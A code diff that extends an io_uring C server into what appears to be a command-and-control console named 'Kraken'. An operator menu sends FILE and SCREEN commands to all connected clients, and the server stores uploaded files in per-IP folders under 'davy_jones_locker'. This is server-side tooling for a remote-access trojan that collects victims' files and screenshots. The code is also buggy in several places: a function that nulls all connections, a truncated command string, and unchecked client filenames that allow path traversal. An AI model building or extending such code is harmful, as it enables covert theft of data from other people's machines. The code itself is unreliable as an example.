@@ -21,9 +21,15 @@
 #define EVENT_TYPE_READ         1
 #define EVENT_TYPE_WRITE        2
 
+#define FILE 1
+#define SCREEN 2
+
 #define MAX_CONN    1024
 
 uint32_t curr_connection = 0;
+uint64_t cmd = -1;
+pthread_mutex_t mutex;
+pthread_t thread;
 
 typedef struct request {
     int event_type;
@@ -37,6 +43,9 @@ typedef struct connection {
     uint32_t sockfd;
     uint64_t signature;
     uint32_t filefd;
+    uint8_t isFileTransferring;
+    uint8_t isScreencapTransferring;
+    char containedFolder[0x100];
 } connection;
 
 struct io_uring ring;
@@ -400,7 +409,18 @@ uint32_t handleNewConn(uint32_t client_socket, struct sockaddr_in *client_addr)
     if (empty_conn == MAX_CONN) return -1;
     conns_list[empty_conn] = (connection *)zh_malloc(sizeof(connection));
     conns_list[empty_conn]->sockfd = client_socket;
+    conns_list[empty_conn]->filefd = -1;
+    conns_list[empty_conn]->isFileTransferring = 0;
     conns_list[empty_conn]->signature = (ip << 16) | client_addr->sin_port;
+    snprintf(conns_list[empty_conn]->containedFolder,
+                sizeof(conns_list[empty_conn]->containedFolder),
+                "davy_jones_locker/%u.%u.%u.%u",
+                (client_addr->sin_addr.s_addr >> 0) & 0xff,
+                (client_addr->sin_addr.s_addr >> 8) & 0xff,
+                (client_addr->sin_addr.s_addr >> 16) & 0xff,
+                (client_addr->sin_addr.s_addr >> 24) & 0xff);
+    mkdir(conns_list[empty_conn]->containedFolder, 0777);
+    /*
     snprintf(fileName, sizeof(fileName), "davy_jones_locker/%u.%u.%u.%u.txt", (client_addr->sin_addr.s_addr >> 0) & 0xff,
                                                             (client_addr->sin_addr.s_addr >> 8) & 0xff,
                                                             (client_addr->sin_addr.s_addr >> 16) & 0xff,
@@ -411,6 +431,7 @@ uint32_t handleNewConn(uint32_t client_socket, struct sockaddr_in *client_addr)
         return -1;
     }
     conns_list[empty_conn]->filefd = filefd;
+    */
     printf("New connection from %u.%u.%u.%u:%u - Signature: %lx\n", (client_addr->sin_addr.s_addr >> 0) & 0xff,
                                                                     (client_addr->sin_addr.s_addr >> 8) & 0xff,
                                                                     (client_addr->sin_addr.s_addr >> 16) & 0xff,
@@ -434,16 +455,112 @@ int handle_client_request(struct request *req) {
 }
 */
 
+uint32_t screencap()
+{
+    char a[0x200];
+    for (uint32_t conn = 0; conn < MAX_CONN; ++conn)
+    {
+        conns_list[conn] = 0;
+        add_read_request(conns_list[conn]);
+    }
+}
+
 uint32_t handle_client_data(connection* conn, struct request *req, int32_t sz)
 {
     struct request *write_req = zh_malloc(sizeof(*req) + sizeof(struct iovec));
     write_req->iov[0].iov_base = zh_malloc(WRITE_SZ);
-    write_req->iov[0].iov_len = WRITE_SZ ? sz : WRITE_SZ < sz;
+    write_req->iov[0].iov_len = WRITE_SZ ? sz : WRITE_SZ <= sz;
     write_req->iovec_count = 1;
     fprintf(stderr, "Hmmm %d\n", sz);
-    memcpy(write_req->iov[0].iov_base, req->iov[0].iov_base, WRITE_SZ ? sz : WRITE_SZ < sz);
-    write_req->client_socket = conn->filefd;
-    add_write_request(write_req);
+    // indicating client start sending a file to server
+    if (!strncmp(req->iov[0].iov_base, "\xfe\xdf\x10\x02START_OF_FILE", strlen("\xfe\xdf\x10\x02START_OF_FILE")))
+    {
+        if (conn->isFileTransferring)
+        {
+            goto FILE_TRANSFER;
+        }
+        else
+        {
+            if (req->iov[0].iov_len - strlen("\xfe\xdf\x10\x02START_OF_FILE") > strlen(req->iov[0].iov_base + strlen("\xfe\xdf\x10\x02START_OF_FILE")))
+            {
+                char transferingFile[0x100];
+                snprintf(transferingFile,
+                        sizeof(transferingFile),
+                        "./%s/%s",
+                        conn->containedFolder,
+                        (char *)req->iov[0].iov_base + strlen("\xfe\xdf\x10\x02START_OF_FILE")
+                        );
+                conn->filefd = open(transferingFile,
+                                    O_WRONLY | O_CREAT | O_TRUNC | O_APPEND,
+                                    S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP);
+                if (conn->filefd == -1)
+                {
+                    printf("%s", transferingFile);
+                    printf("%s", conn->containedFolder);
+                    return 0;
+                    //fatal_error("wtf????");
+                }
+                conn->isFileTransferring = 1;
+                return 0;
+            }
+        }
+    }
+    else if (!strncmp(req->iov[0].iov_base, "\xff\xff\xff\xff eof", 8))
+    {
+        if (conn->isFileTransferring)
+        {
+            conn->isFileTransferring = 0;
+            close(conn->filefd);
+            conn->filefd = -1;
+            return 0;
+        }
+        else
+        {
+            goto NORMAL_TRANSFER;
+        }
+    }
+    else
+    {
+        NORMAL_TRANSFER:
+            return 0;
+    }
+    FILE_TRANSFER:
+        memcpy(write_req->iov[0].iov_base, req->iov[0].iov_base, WRITE_SZ ? sz : WRITE_SZ <= sz);
+        write_req->client_socket = conn->filefd;
+        add_write_request(write_req);
+        return 0;
+}
+
+uint32_t fetch_cmd()
+{
+    char *loccmd = zh_malloc(0x20);
+    memset(loccmd, 0, 0x20);
+    switch (cmd)
+    {
+        case FILE:
+            memcpy(loccmd, "FILE", 4);
+            cmd = -1;
+            break;
+        case SCREEN:
+            memcpy(loccmd, "SCREEN", 4);
+            cmd = -1;
+            break;
+        default:
+            return 0;
+    }
+    for (uint64_t conn = 0; conn < MAX_CONN; ++conn)
+    {
+        if (conns_list[conn])
+        {
+            struct request *req = zh_malloc(sizeof(*req) + sizeof(struct iovec));
+            req->iov[0].iov_base = loccmd;
+            req->iov[0].iov_len = strlen(loccmd);
+            req->iovec_count = 1;
+            req->client_socket = conns_list[conn]->sockfd;
+            add_write_request(req);            
+        }
+    }
+    return 0;
 }
 
 void server_loop(int server_socket) {
@@ -453,7 +570,6 @@ void server_loop(int server_socket) {
     socklen_t client_addr_len = sizeof(client_addr);
 
     add_accept_request(server_socket, &client_addr, &client_addr_len);
-
     while (1) {
         int ret = io_uring_wait_cqe(&ring, &cqe);
         if (ret < 0)
@@ -464,6 +580,8 @@ void server_loop(int server_socket) {
                     strerror(-cqe->res), req->event_type);
             exit(1);
         }
+
+        fetch_cmd();
 
         switch (req->event_type) {
             case EVENT_TYPE_ACCEPT:
@@ -483,7 +601,7 @@ void server_loop(int server_socket) {
                             connection *_ = conns_list[conn];
                             conns_list[conn] = 0x0;
                             close(_->sockfd);
-                            close(_->filefd);
+                            if (_->filefd != -1) close(_->filefd);
                             free(_);
                             --curr_connection;
                             break;
@@ -523,18 +641,43 @@ void server_loop(int server_socket) {
     }
 }
 
-void sigint_handler(int signo) {
+void *input(void *args)
+{
+    char loc_cmd[0x60];
+    while (1)
+    {
+        memset(loc_cmd, 0, sizeof(loc_cmd));
+        printf("Kraken v0.1.0\n");
+        printf("1. FILE\n");
+        printf("2. SCREEN\n");
+        printf("Kraken> ");
+        read(0, loc_cmd, 0x20);
+        uint64_t _ = atoll(loc_cmd);
+        pthread_mutex_lock(&mutex);
+        cmd = _;
+        pthread_mutex_unlock(&mutex);
+    }
+}
+
+void init()
+{
+    if (pthread_mutex_init(&mutex, NULL) != 0) fatal_error("pthread_mutex_init()");
+}
+
+void sigint_handler(int signo)
+{
     printf("^C pressed. Shutting down.\n");
     io_uring_queue_exit(&ring);
     exit(0);
 }
 
 int main() {
+    init();
     int server_socket = setup_listening_socket(DEFAULT_SERVER_PORT);
-
     signal(SIGINT, sigint_handler);
     io_uring_queue_init(QUEUE_DEPTH, &ring, 0);
+    pthread_create(&thread, NULL, &input, NULL);
     server_loop(server_socket);
-
+    pthread_mutex_destroy(&mutex);
     return 0;
 }
